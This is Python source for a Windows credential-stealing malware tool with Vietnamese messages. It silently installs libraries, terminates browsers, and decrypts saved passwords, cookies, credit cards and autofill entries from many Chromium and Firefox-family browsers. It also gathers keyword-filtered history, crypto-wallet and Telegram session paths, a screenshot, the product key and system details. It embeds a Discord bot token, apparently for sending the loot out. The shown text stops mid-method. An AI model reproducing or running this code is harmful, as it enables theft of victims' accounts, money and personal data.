import os
import json
import base64
import sqlite3
import shutil
import requests
import zipfile
import io
import time
import subprocess
import re
import datetime
import threading
import glob
import sys
import platform

from pathlib import Path
import psutil
from screeninfo import get_monitors

from tqdm import tqdm
import random

# Initial placeholders for all potentially missing external imports
AES = None
DES3 = None
CryptUnprotectData = None
decode = None
sha1 = None
pbkdf2_hmac = None

discord = None
commands = None
aiohttp = None

Image = None
pyautogui = None

# Function to perform/re-evaluate imports of external libraries
def perform_dynamic_imports():
    global AES, DES3, CryptUnprotectData, decode, sha1, pbkdf2_hmac
    global discord, commands, aiohttp
    global Image, pyautogui

    # Crypto and related libraries
    try:
        from Crypto.Cipher import AES as imported_AES, DES3 as imported_DES3
        from win32crypt import CryptUnprotectData as imported_CryptUnprotectData
        from pyasn1.codec.der.decoder import decode as imported_decode
        from hashlib import sha1 as imported_sha1, pbkdf2_hmac as imported_pbkdf2_hmac
        AES = imported_AES
        DES3 = imported_DES3
        CryptUnprotectData = imported_CryptUnprotectData
        decode = imported_decode
        sha1 = imported_sha1
        pbkdf2_hmac = imported_pbkdf2_hmac
    except ImportError:
        AES, DES3 = None, None
        CryptUnprotectData = None
        decode = None
        sha1, pbkdf2_hmac = None, None

    # Discord and aiohttp
    try:
        import discord as imported_discord
        from discord.ext import commands as imported_commands
        import aiohttp as imported_aiohttp
        discord = imported_discord
        commands = imported_commands
        aiohttp = imported_aiohttp
    except ImportError:
        discord, commands, aiohttp = None, None, None

    # PIL and PyAutoGUI
    try:
        from PIL import Image as imported_Image
        import pyautogui as imported_pyautogui
        Image = imported_Image
        pyautogui = imported_pyautogui
    except ImportError:
        Image, pyautogui = None, None

# Call this at the very beginning of the script to set up the globals
perform_dynamic_imports()


# List of required libraries
required_libraries = [
    "pycryptodome",
    "pywin32",
    "pyasn1",
    "psutil",
    "screeninfo",
    "discord.py",
    "aiohttp",
    "Pillow",
    "pyautogui",
    "tqdm",
    "requests",
]

def install_missing_libraries():
    print("→ Đang cài thư viện...")
    for lib in required_libraries:
        try:
            # Attempt to import to check if it's already available
            # This handles cases where a dependency might not be directly in sys.modules
            if lib == "pycryptodome":
                if "Crypto" in sys.modules and hasattr(sys.modules["Crypto"], "Cipher"): continue
            elif lib == "pywin32":
                if "win32crypt" in sys.modules: continue
            elif lib == "pyasn1":
                if "pyasn1" in sys.modules: continue
            elif lib == "discord.py":
                if "discord" in sys.modules: continue
            elif lib == "aiohttp":
                if "aiohttp" in sys.modules: continue
            elif lib == "Pillow":
                if "PIL" in sys.modules: continue
            elif lib == "pyautogui":
                if "pyautogui" in sys.modules: continue
            elif lib == "tqdm":
                if "tqdm" in sys.modules: continue
            elif lib == "requests":
                if "requests" in sys.modules: continue
            else: # For any other library added to the list in the future
                __import__(lib.split(".")[0])
                continue
        except ImportError:
            # Library not found, proceed to install
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", lib],
                                      stdout=subprocess.DEVNULL, # Suppress pip output
                                      stderr=subprocess.DEVNULL) # Suppress pip errors
            except subprocess.CalledProcessError:
                pass # Silently handle installation failures
            except Exception:
                pass # Silently handle other unexpected errors
    print("→ Đã cài đặt xong thư viện.")


# Discord bot configuration
DISCORD_TOKEN = 'MTM5NTc1MzA2MDYxMzIyNjU4Ng.GGpegW.Uv02BdGhUGagI6FaQh-Ad3rTedy9GRWmsfPWek'
USER_ID = 1371467463962791997
MAX_FILE_SIZE = 8 * 1024 * 1024  # 8MB limit for Discord free

# Important keywords for filtering
ImportantKeywords = [
    'paypal', 'perfectmoney', 'etsy', 'facebook', 'ebay', 'coin', 'binance', 'wallet', 'payment', 'amazon',
    'crypto', 'business', 'server', 'instagram', 'rdp', 'blockchain', 'vpn', 'google', 'roblox', 'host',
    'cloud', 'houbi', 'hbo', 'spotify', 'twitch', 'steam', 'reddit', 'twitter', 'instagram', 'prime',
    'subgiare', 'netflix', 'garena', 'riotgames', 'clone', 'via', 'nguyenlieu', 'otp', 'sim', 'smit',
    'proxy', 'mail', 'traodoisub', 'tuongtaccheo', 'bysun', 'mmo', 'tool', 'bm', 'tkqc', 'tainguyen',
    'thesieure', 'sms', 'captcha', 'bank', 'money', 'hosting', 'tenten', 'domain', 'linkedin', 'tiktok',
    'snapchat', 'pinterest', 'venmo', 'skrill', 'payoneer', 'westernunion', 'cashapp', 'zelle', 'bitcoin',
    'ethereum', 'dongvan', 'metamask', 'trustwallet'
]

# Browser paths (default list)
ch_dc_browsers = {
    "Chromium": f"{os.getenv('LOCALAPPDATA')}\\Chromium\\User Data",
    "Thorium": f"{os.getenv('LOCALAPPDATA')}\\Thorium\\User Data",
    "Chrome": f"{os.getenv('LOCALAPPDATA')}\\Google\\Chrome\\User Data",
    "Chrome (x86)": f"{os.getenv('LOCALAPPDATA')}\\Google(x86)\\Chrome\\User Data",
    "Chrome SxS": f"{os.getenv('LOCALAPPDATA')}\\Google\\Chrome SxS\\User Data",
    "Maple": f"{os.getenv('LOCALAPPDATA')}\\MapleStudio\\ChromePlus\\User Data",
    "Iridium": f"{os.getenv('LOCALAPPDATA')}\\Iridium\\User Data",
    "7Star": f"{os.getenv('LOCALAPPDATA')}\\7Star\\7Star\\User Data",
    "CentBrowser": f"{os.getenv('LOCALAPPDATA')}\\CentBrowser\\User Data",
    "Chedot": f"{os.getenv('LOCALAPPDATA')}\\Chedot\\User Data",
    "Vivaldi": f"{os.getenv('LOCALAPPDATA')}\\Vivaldi\\User Data",
    "Kometa": f"{os.getenv('LOCALAPPDATA')}\\Kometa\\User Data",
    "Elements": f"{os.getenv('LOCALAPPDATA')}\\Elements Browser\\User Data",
    "Epic Privacy Browser": f"{os.getenv('LOCALAPPDATA')}\\Epic Privacy Browser\\User Data",
    "Uran": f"{os.getenv('LOCALAPPDATA')}\\uCozMedia\\Uran\\User Data",
    "Fenrir": f"{os.getenv('LOCALAPPDATA')}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
    "Catalina": f"{os.getenv('LOCALAPPDATA')}\\CatalinaGroup\\Citrio\\User Data",
    "Coowon": f"{os.getenv('LOCALAPPDATA')}\\Coowon\\2Coowon\\User Data",
    "Liebao": f"{os.getenv('LOCALAPPDATA')}\\liebao\\User Data",
    "QIP Surf": f"{os.getenv('LOCALAPPDATA')}\\QIP Surf\\User Data",
    "Orbitum": f"{os.getenv('LOCALAPPDATA')}\\Orbitum\\User Data",
    "Dragon": f"{os.getenv('LOCALAPPDATA')}\\Comodo\\Dragon\\User Data",
    "360Browser": f"{os.getenv('LOCALAPPDATA')}\\360Browser\\Browser\\User Data",
    "Maxthon": f"{os.getenv('LOCALAPPDATA')}\\Maxthon3\\User Data",
    "K-Melon": f"{os.getenv('LOCALAPPDATA')}\\K-Melon\\User Data",
    "CocCoc": f"{os.getenv('LOCALAPPDATA')}\\CocCoc\\Browser\\User Data",
    "Brave": f"{os.getenv('LOCALAPPDATA')}\\BraveSoftware\\Brave-Browser\\User Data",
    "Amigo": f"{os.getenv('LOCALAPPDATA')}\\Amigo\\User Data",
    "Torch": f"{os.getenv('LOCALAPPDATA')}\\Torch\\User Data",
    "Sputnik": f"{os.getenv('LOCALAPPDATA')}\\Sputnik\\Sputnik\\User Data",
    "Edge": f"{os.getenv('LOCALAPPDATA')}\\Microsoft\\Edge\\User Data",
    "DCBrowser": f"{os.getenv('LOCALAPPDATA')}\\DCBrowser\\User Data",
    "Yandex": f"{os.getenv('LOCALAPPDATA')}\\Yandex\\YandexBrowser\\User Data",
    "UR Browser": f"{os.getenv('LOCALAPPDATA')}\\UR Browser\\User Data",
    "Slimjet": f"{os.getenv('LOCALAPPDATA')}\\Slimjet\\User Data",
    "Opera": f"{os.getenv('APPDATA')}\\Opera Software\\Opera Stable",
    "OperaGX": f"{os.getenv('APPDATA')}\\Opera Software\\Opera GX Stable",
    "Speed360": f"{os.getenv('APPDATA')}\\Local\\360chrome\\Chrome\\User Data",
    "QQBrowser": f"{os.getenv('APPDATA')}\\Local\\Tencent\\QQBrowser\\User Data",
    "Sogou": f"{os.getenv('APPDATA')}\\SogouExplorer\\Webkit",
    "Discord": f"{os.getenv('APPDATA')}\\discord",
    "Discord Canary": f"{os.getenv('APPDATA')}\\discordcanary",
    "Lightcord": f"{os.getenv('APPDATA')}\\Lightcord",
    "Discord PTB": f"{os.getenv('APPDATA')}\\discordptb"
}

gck_browser_paths = {
    "Firefox": f"{os.getenv('APPDATA')}\\Mozilla\\Firefox",
    "Pale Moon": f"{os.getenv('APPDATA')}\\Moonchild Productions\\Pale Moon",
    "SeaMonkey": f"{os.getenv('APPDATA')}\\Mozilla\\SeaMonkey",
    "Waterfox": f"{os.getenv('APPDATA')}\\Waterfox",
    "Mercury": f"{os.getenv('APPDATA')}\\mercury",
    "K-Melon": f"{os.getenv('APPDATA')}\\K-Melon",
    "IceDragon": f"{os.getenv('APPDATA')}\\Comodo\\IceDragon",
    "Cyberfox": f"{os.getenv('APPDATA')}\\8pecxstudios\\Cyberfox",
    "BlackHaw": f"{os.getenv('APPDATA')}\\NETGATE Technologies\\BlackHaw",
}

class DataExtractor:
    def __init__(self):
        self.temp_path = os.path.join(os.getenv('TEMP', 'C:\\Windows\\Temp'), os.getenv('COMPUTERNAME', 'defaultValue'))
        self.profiles = [f"Profile {i}" for i in range(50)] + ['Default']
        self.total_logins = 0
        self.total_cookies = 0
        self.total_ccards = 0
        self.total_autofill = 0
        self.total_history = 0
        self.total_extensions = 0
        self.total_wallets = 0
        self.total_telegram = 0
        os.makedirs(self.temp_path, exist_ok=True)
        self.progress = 0.0
        self.progress_lock = threading.Lock()
        self.tasks_completed = 0
        self.total_tasks = 10 # Approximate number of major tasks

    def update_progress(self, increment):
        with self.progress_lock:
            self.progress += increment
            if self.progress > 100:
                self.progress = 100

    async def get_ip_info(self):
        if aiohttp is None:
            self.update_progress(5.0)
            return "IP: N/A (aiohttp not installed)", "Unknown", "Unknown"
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            try:
                async with session.get("http://ip-api.com/json/?fields=8195") as response:
                    data = await response.json()
                    self.update_progress(5.0)
                    return (
                        f"IP: {data['query']}\nCountry: {data['countryCode']} - {data['country']}",
                        data['countryCode'],
                        data['query']
                    )
            except Exception as e:
                self.update_progress(5.0)
                return f"IP: N/A ({e})", "Unknown", "Unknown"
            finally:
                await session.close()

    def check_browser_running(self, browser_name):
        if psutil is None: return False
        for proc in psutil.process_iter(['name']):
            if browser_name.lower() in proc.info['name'].lower():
                return True
        return False

    def close_browser(self, browser_name):
        if psutil is None: return True
        for proc in psutil.process_iter(['name']):
            if browser_name.lower() in proc.info['name'].lower():
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                    return True
                except:
                    return False
        return True

    def get_system_info(self):
        if psutil is None or pyautogui is None or get_monitors is None:
            os.makedirs(os.path.join(self.temp_path, "SystemInfo"), exist_ok=True)
            with open(os.path.join(self.temp_path, "SystemInfo/system_info.txt"), 'w', encoding='utf-8') as f:
                f.write("System info collection skipped due to missing libraries (psutil, pyautogui, screeninfo)")
            self.update_progress(10.0)
            return
        try:
            os.makedirs(os.path.join(self.temp_path, "SystemInfo"), exist_ok=True)
            computer_os = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_OperatingSystem).Caption"', capture_output=True, shell=True, text=True).stdout.strip() or "Unknown"
            cpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_Processor).Name"', capture_output=True, shell=True, text=True).stdout.strip() or "Unknown"
            gpu = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_VideoController).Name"', capture_output=True, shell=True, text=True).stdout.strip() or "Unknown"
            ram = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).TotalPhysicalMemory"', capture_output=True, shell=True, text=True)
            ram = str(round(int(ram.stdout.strip()) / (1024 ** 3))) if ram.returncode == 0 else "Unknown"
            model = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Model"', capture_output=True, shell=True, text=True).stdout.strip() or "Unknown"
            username = os.getenv("UserName")
            hostname = os.getenv("COMPUTERNAME")
            uuid = subprocess.run('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystemProduct).UUID"', capture_output=True, shell=True, text=True).stdout.strip() or "Unknown"
            product_key = subprocess.run('powershell -Command "(Get-WmiObject -Class SoftwareLicensingService).OA3xOriginalProductKey"', capture_output=True, shell=True, text=True).stdout.strip() or "Failed to get product key"
            monitors = get_monitors()
            screen_resolution = ', '.join([f"{m.width}x{m.height}" for m in monitors]) if monitors else "Unknown"
            av_list = subprocess.run("Get-WmiObject -Namespace 'Root\\SecurityCenter2' -Class AntivirusProduct | Select-Object displayName", capture_output=True, shell=True, text=True)
            avs = ", ".join([av.strip() for av in av_list.stdout.strip().splitlines()[1:] if av.strip()]) if av_list.returncode == 0 else "No antivirus found"
            _, addrs = next(iter(psutil.net_if_addrs().items()))
            mac = addrs[0].address

            tasklist = subprocess.run("tasklist", capture_output=True, shell=True, text=True).stdout.strip()
            installed_apps = subprocess.run('powershell "Get-WmiObject -Class Win32_Product | Select-Object Name"', capture_output=True, shell=True, text=True).stdout.strip()

            screenshot_path = os.path.join(self.temp_path, "SystemInfo/screenshot.png")
            if pyautogui is not None:
                screenshot = pyautogui.screenshot()
                screenshot.save(screenshot_path)

            with open(os.path.join(self.temp_path, "SystemInfo/system_info.txt"), 'w', encoding='utf-8') as f:
                f.write(f'''
**PC Username:** `{username}`
**PC Name:** `{hostname}`
**Model:** `{model}`
**Screen Resolution:** `{screen_resolution}`
**OS:** `{computer_os}`
**Product Key:** `{product_key}`
**MAC:** `{mac}`
**UUID:** `{uuid}`
**CPU:** `{cpu}`
**GPU:** `{gpu}`
**RAM:** `{ram}GB`
**Antivirus:** `{avs}`
\nDanh sách ứng dụng đang chạy:\n{tasklist}
\nDanh sách phần mềm đã cài đặt:\n{installed_apps}
''')
            self.update_progress(10.0)
        except Exception as e:
            os.makedirs(os.path.join(self.temp_path, "SystemInfo"), exist_ok=True)
            with open(os.path.join(self.temp_path, "SystemInfo/system_info.txt"), 'w', encoding='utf-8') as f:
                f.write(f"Error occurred during system info collection: {e}")
            self.update_progress(10.0)

    def auto_detect_browsers(self):
        detected_browsers = {}
        search_paths = [
            os.path.join(os.getenv('LOCALAPPDATA')),
            os.path.join(os.getenv('APPDATA')),
            os.path.join(os.getenv('PROGRAMFILES')),
            os.path.join(os.getenv('PROGRAMFILES(X86)'))
        ]
        for base_path in search_paths:
            try:
                for root, _, files in os.walk(base_path):
                    if 'Local State' in files:
                        if any(browser in root for browser in ['Chrome', 'Edge', 'Opera', 'Brave', 'Vivaldi', 'Yandex']):
                            browser_name = root.split(os.sep)[-2] if 'User Data' in root else root.split(os.sep)[-1]
                            detected_browsers[browser_name] = os.path.join(root)
                    if 'profiles.ini' in files:
                        if any(browser in root for browser in ['Firefox', 'Waterfox', 'Pale Moon', 'SeaMonkey']):
                            browser_name = root.split(os.sep)[-1]
                            detected_browsers[browser_name] = os.path.join(root)
            except:
                pass
        self.update_progress(5.0)
        return detected_browsers

    def detect_crypto_wallets(self):
        wallets = {}
        wallet_paths = {
            "MetaMask": [
                os.path.join(os.getenv('LOCALAPPDATA'), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"),
                os.path.join(os.getenv('APPDATA'), "Mozilla\\Firefox\\Profiles", "*", "extensions", "{nkbihfbeogaeaoehlefnkodbefgpgknn}.xpi")
            ],
            "TrustWallet": [
                os.path.join(os.getenv('LOCALAPPDATA'), "Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"),
                os.path.join(os.getenv('APPDATA'), "Mozilla\\Firefox\\Profiles", "*", "extensions", "{egjidjbpglichdcondbcbdnbeeppgdph}.xpi")
            ]
        }
        for wallet_name, paths in wallet_paths.items():
            for path in paths:
                found_paths = glob.glob(path)
                if found_paths:
                    wallets[wallet_name] = found_paths
        if wallets:
            os.makedirs(os.path.join(self.temp_path, "Wallets"), exist_ok=True)
            with open(os.path.join(self.temp_path, "Wallets/wallets.txt"), "w", encoding="utf-8") as f:
                for wallet_name, paths in wallets.items():
                    f.write(f"Wallet: {wallet_name}\nPaths:\n" + "\n".join(f"- {p}" for p in paths) + "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            self.total_wallets += len(wallets)
        self.update_progress(5.0)
        return len(wallets)

    def detect_telegram_session(self):
        telegram_path = os.path.join(os.getenv('APPDATA'), "Telegram Desktop", "tdata")
        if not os.path.exists(telegram_path):
            self.update_progress(5.0)
            return 0
        try:
            os.makedirs(os.path.join(self.temp_path, "Telegram"), exist_ok=True)
            session_files = glob.glob(os.path.join(telegram_path, "*"))
            if session_files:
                with open(os.path.join(self.temp_path, "Telegram/telegram_session.txt"), "w", encoding="utf-8") as f:
                    f.write("Telegram Session Files:\n" + "\n".join(f"- {f}" for f in session_files) + "\n")
                self.total_telegram += len(session_files)
            self.update_progress(5.0)
            return len(session_files)
        except Exception as e:
            self.update_progress(5.0)
            return 0

    def get_master_key(self, path):
        if CryptUnprotectData is None: return None
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            return None
        for _ in range(3):
            try:
                with open(local_state_path, "r", encoding="utf-8") as f:
                    local_state = json.load(f)
                master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                self.update_progress(2.0)
                return CryptUnprotectData(master_key, None, None, None, 0)[1]
            except:
                time.sleep(1)
        return None

    def decrypt_value(self, buff, master_key):
        if AES is None: return None
        try:
            if buff[:3] in [b'v10', b'v11']:
                iv, payload = buff[3:15], buff[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                return cipher.decrypt(payload)[:-16].decode()
        except:
            return None

    def get_gecko_key(self, directory, master_password=""):
        if DES3 is None or decode is None: return None
        dbfile = os.path.join(directory, "key4.db")
        if not os.path.exists(dbfile):
            return None
        try:
            conn = sqlite3.connect(dbfile)
            c = conn.cursor()
            c.execute("SELECT item1, item2 FROM metadata")
            global_salt, item2 = next(c)
            try:
                decoded_item2, _ = decode(item2)
                encryption_method = '3DES'
                entry_salt = decoded_item2[0][1][0].asOctets()
                cipher_t = decoded_item2[1].asOctets()
            except:
                encryption_method = 'AES'
                decoded_item2 = decode(item2)
            c.execute("SELECT a11, a102 FROM nssPrivate WHERE a102 = ?", (b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01",))
            a11, _ = next(c)
            if encryption_method == 'AES':
                decoded_a11 = decode(a11)
                entry_salt = decoded_a11[0][0][1][0][1][0].asOctets()
                iteration_count = int(decoded_a11[0][0][1][0][1][1])
                key_length = int(decoded_a11[0][0][1][0][1][2])
                encoded_password = sha1(global_salt + master_password.encode()).digest()
                key = pbkdf2_hmac('sha256', encoded_password, entry_salt, iteration_count, dklen=key_length)
                init_vector = b'\x04\x0e' + decoded_a11[0][0][1][1][1].asOctets()
                cipher = AES.new(key, AES.MODE_CBC, init_vector)
                self.update_progress(2.0)
                return cipher.decrypt(decoded_a11[0][1].asOctets())[:24]
            else:
                decoded_a11, _ = decode(a11)
                entry_salt = decoded_a11[0][1][0].asOctets()
                cipher_t = decoded_a11[1].asOctets()
                hp = sha1(global_salt + master_password.encode()).digest()
                pes = entry_salt + b"\x00" * (20 - len(entry_salt))
                chp = sha1(hp + entry_salt).digest()
                import hmac # hmac is needed here for DES3
                k1 = hmac.new(chp, pes + entry_salt, sha1).digest()
                tk = hmac.new(chp, pes, sha1).digest()
                k2 = hmac.new(chp, tk + entry_salt, sha1).digest()
                key = k1 + k2
                self.update_progress(2.0)
                return DES3.new(key[:24], DES3.MODE_CBC, key[-8:]).decrypt(cipher_t)[:24]
        except Exception as e:
            return None
        finally:
            conn.close()

    def decode_gecko_login(self, key, data):
        if DES3 is None or decode is None: return None
        try:
            asn1data, _ = decode(base64.b64decode(data))
            iv, ciphertext = asn1data[1][1].asOctets(), asn1data[2].asOctets()
            des = DES3.new(key, DES3.MODE_CBC, iv)
            return des.decrypt(ciphertext)[:-des.block_size].decode()
        except:
            return None

    def extract_chromium_data(self, browser, path, profile, master_key):
        if master_key is None or CryptUnprotectData is None or AES is None:
            self.update_progress(5.0) # Mark some progress even if skipped
            return
        if self.check_browser_running(browser):
            self.close_browser(browser)

        def safe_copy(src, dst):
            for _ in range(3):
                try:
                    shutil.copy(src, dst)
                    return True
                except:
                    time.sleep(1)
            return False

        def safe_remove(file_path):
            for _ in range(3):
                try:
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    return True
                except:
                    time.sleep(1)
            return False

        def save_login_data():
            login_path = f"{path}\\Login Data" if browser in ["Opera", "OperaGX"] else f"{path}\\{profile}\\Login Data"
            if not os.path.exists(login_path):
                return 0
            temp_db = os.path.join(self.temp_path, f"login_db_{profile}")
            if not safe_copy(login_path, temp_db):
                return 0
            try:
                conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                count = 0
                result = ""
                for row in cursor.fetchall():
                    if not all(row[:2]):
                        continue
                    password = self.decrypt_value(row[2], master_key)
                    if password:
                        result += f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\nApplication: {browser} [Profile: {profile}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        count += 1
                        for keyword in ImportantKeywords:
                            if keyword in row[0].lower():
                                os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/Passwords"), exist_ok=True)
                                with open(os.path.join(self.temp_path, f"Browsers/{browser}/Passwords/Important_Logins.txt"), "a", encoding="utf-8") as f:
                                    f.write(result)
                                break
                if count:
                    os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/Passwords"), exist_ok=True)
                    with open(os.path.join(self.temp_path, f"Browsers/{browser}/Passwords/{browser}_{profile}_Passwords.txt"), "w", encoding="utf-8") as f:
                        f.write(result)
                conn.close()
                self.update_progress(2.0)
                return count
            except Exception as e:
                return 0
            finally:
                safe_remove(temp_db)

        def save_cookies():
            cookie_path = f"{path}\\Network\\Cookies" if browser in ["Opera", "OperaGX"] else f"{path}\\{profile}\\Network\\Cookies"
            if not os.path.exists(cookie_path):
                return 0
            temp_db = os.path.join(self.temp_path, f"cookie_db_{profile}")
            if not safe_copy(cookie_path, temp_db):
                return 0
            try:
                conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies")
                count = 0
                result = ""
                fb_cookies = []
                for row in cursor.fetchall():
                    if not all(row[:4]):
                        continue
                    cookie = self.decrypt_value(row[3], master_key)
                    if cookie:
                        result += f"{row[0]}\t{'TRUE' if row[5] else 'FALSE'}\t{row[2]}\t{'TRUE' if row[6] else 'FALSE'}\t{row[4]}\t{row[1]}\t{cookie}\n"
                        if row[0] == ".facebook.com":
                            fb_cookies.append(f"{row[1]}={cookie}")
                        count += 1
                if count:
                    os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/Cookies"), exist_ok=True)
                    with open(os.path.join(self.temp_path, f"Browsers/{browser}/Cookies/{browser}_{profile}_Cookies.txt"), "w", encoding="utf-8") as f:
                        f.writelines(result)
                    if Facebook is not None and "c_user" in ";".join(fb_cookies):
                        fb_data = Facebook(";".join(fb_cookies)).ADS_Checker()
                        if fb_data:
                            os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/Facebook"), exist_ok=True)
                            with open(os.path.join(self.temp_path, f"Browsers/{browser}/Facebook/{browser}_{profile}_Facebook_Cookies.txt"), "a", encoding="utf-8") as f:
                                f.write(f"Cookie: {';'.join(fb_cookies)}\n\n{fb_data}\n\n\n")
                conn.close()
                self.update_progress(2.0)
                return count
            except Exception as e:
                return 0
            finally:
                safe_remove(temp_db)

        def save_ccards():
            web_data_path = f"{path}\\Web Data" if browser in ["Opera", "OperaGX"] else f"{path}\\{profile}\\Web Data"
            if not os.path.exists(web_data_path):
                return 0
            temp_db = os.path.join(self.temp_path, f"cards_db_{profile}")
            if not safe_copy(web_data_path, temp_db):
                return 0
            try:
                conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards")
                count = 0
                result = ""
                for row in cursor.fetchall():
                    if not all(row[:4]):
                        continue
                    card_number = self.decrypt_value(row[3], master_key)
                    if card_number:
                        result += f"Card Name: {row[0]}\nCard Number: {card_number}\nCard Expiration: {row[1]} / {row[2]}\nAdded: {datetime.datetime.fromtimestamp(row[4])}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        count += 1
                if count:
                    os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/CreditCards"), exist_ok=True)
                    with open(os.path.join(self.temp_path, f"Browsers/{browser}/CreditCards/{browser}_{profile}_CreditCards.txt"), "w", encoding="utf-8") as f:
                        f.writelines(result)
                conn.close()
                self.update_progress(2.0)
                return count
            except Exception as e:
                return 0
            finally:
                safe_remove(temp_db)

        def save_autofill():
            web_data_path = f"{path}\\Web Data" if browser in ["Opera", "OperaGX"] else f"{path}\\{profile}\\Web Data"
            if not os.path.exists(web_data_path):
                return 0
            temp_db = os.path.join(self.temp_path, f"autofill_db_{profile}")
            if not safe_copy(web_data_path, temp_db):
                return 0
            try:
                conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT name, value FROM autofill")
                count = 0
                result = ""
                for row in cursor.fetchall():
                    if not all(row):
                        continue
                    result += f"Name: {row[0]}\nValue: {row[1]}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    count += 1
                if count:
                    os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/AutoFills"), exist_ok=True)
                    with open(os.path.join(self.temp_path, f"Browsers/{browser}/AutoFills/{browser}_{profile}_AutoFills.txt"), "w", encoding="utf-8") as f:
                        f.writelines(result)
                conn.close()
                self.update_progress(2.0)
                return count
            except Exception as e:
                return 0
            finally:
                safe_remove(temp_db)

        def save_history():
            history_path = f"{path}\\History" if browser in ["Opera", "OperaGX"] else f"{path}\\{profile}\\History"
            if not os.path.exists(history_path):
                return 0
            temp_db = os.path.join(self.temp_path, f"history_db_{profile}")
            if not safe_copy(history_path, temp_db):
                return 0
            try:
                conn = sqlite3.connect(f"file:{temp_db}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
                count = 0
                result = ""
                important_result = ""
                for row in cursor.fetchall():
                    if not row[0]:
                        continue
                    last_visit = datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=row[3])
                    entry = f"URL: {row[0]}\nTitle: {row[1]}\nVisit Count: {row[2]}\nLast Visit: {last_visit}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    result += entry
                    count += 1
                    for keyword in ImportantKeywords:
                        if keyword in row[0].lower():
                            important_result += entry
                            break
                if count:
                    os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/History"), exist_ok=True)
                    with open(os.path.join(self.temp_path, f"Browsers/{browser}/History/{browser}_{profile}_History.txt"), "w", encoding="utf-8") as f:
                        f.writelines(result)
                    if important_result:
                        os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/History"), exist_ok=True)
                        with open(os.path.join(self.temp_path, f"Browsers/{browser}/History/{browser}_{profile}_Important_History.txt"), "w", encoding="utf-8") as f:
                            f.writelines(important_result)
                conn.close()
                self.update_progress(2.0)
                return count
            except Exception as e:
                return 0
            finally:
                safe_remove(temp_db)

        def save_extensions():
            extensions_path = f"{path}\\Extensions" if browser in ["Opera", "OperaGX"] else f"{path}\\{profile}\\Extensions"
            if not os.path.exists(extensions_path):
                return 0
            try:
                count = 0
                result = ""
                for ext_dir in os.listdir(extensions_path):
                    manifest_path = os.path.join(extensions_path, ext_dir, "manifest.json")
                    if os.path.exists(manifest_path):
                        try:
                            with open(manifest_path, "r", encoding="utf-8") as f:
                                manifest = json.load(f)
                            ext_name = manifest.get("name", "Unknown")
                            ext_version = manifest.get("version", "Unknown")
                            result += f"Extension: {ext_name}\nVersion: {ext_version}\nID: {ext_dir}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            count += 1
                        except:
                            continue
                if count:
                    os.makedirs(os.path.join(self.temp_path, f"Browsers/{browser}/Extensions"), exist_ok=True)
                    with open(os.path.join(self.temp_path, f"Browsers/{browser}/Extensions/{browser}_{profile}_Extensions.txt"), "w", encoding="utf-8") as f:
                        f.writelines(result)
                self.update_progress(2.0)
                return count
            except Exception as e:
                return 0

        threads = []
        # Each func call contributes to total progress, but actual progress is controlled by show_progress_bar
        for func in [save_login_data, save_cookies, save_ccards, save_autofill, save_history, save_extensions]:
            func_name = func.__name__
            attr_name = 'total_logins' if func_name == 'save_login_data' else f"total_{func_name.split('_')[1]}"
            thread = threading.Thread(target=lambda: setattr(self, attr_name, getattr(self, attr_name) + func()))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

    def extract_gecko_data(self, browser, profiles):
        if DES3 is None or decode is None:
            self.update_progress(5.0) # Mark some progress even if skipped
            return
        if self.check_browser_running(browser):
            self.close_browser(browser)

        def safe_copy(src, dst):
            for _ in range(3):
                try:
                    shutil.copy(src, dst)
                    return True
                except:
                    time.sleep(1)
            return False

